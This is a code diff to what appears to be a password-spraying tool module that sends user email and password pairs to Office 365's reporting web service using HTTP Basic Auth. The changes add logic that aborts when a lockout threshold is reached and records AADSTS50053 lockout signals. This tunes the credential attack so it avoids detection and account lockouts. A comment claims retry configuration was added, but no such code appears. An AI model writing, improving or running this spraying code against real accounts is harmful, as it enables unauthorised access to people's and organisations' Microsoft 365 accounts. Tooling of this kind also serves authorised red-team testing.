@@ -32,6 +32,9 @@ class SprayModule_reporting(SprayerBase):
               crashing the run
         """
         try:
+            # Updated: abort early if lockout threshold already reached.
+            if self._should_abort():
+                return
             # Build email if not already built
             email = self.HELPER.check_email(user, domain)
 
@@ -58,6 +61,7 @@ class SprayModule_reporting(SprayerBase):
                 url = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc"
 
             auth = HTTPBasicAuth(email, password)
+            # Updated: include retry configuration for transient failures.
             response = self._send_request(
                 "get",
                 url,
@@ -78,6 +82,9 @@ class SprayModule_reporting(SprayerBase):
                     "password": password,
                 },
             )
+            # Updated: detect explicit lockout signals where available.
+            if self._detect_lockout_signal(response):
+                self._record_lockout(reason="AADSTS50053")
             status = response.status_code
 
             if status == 200:
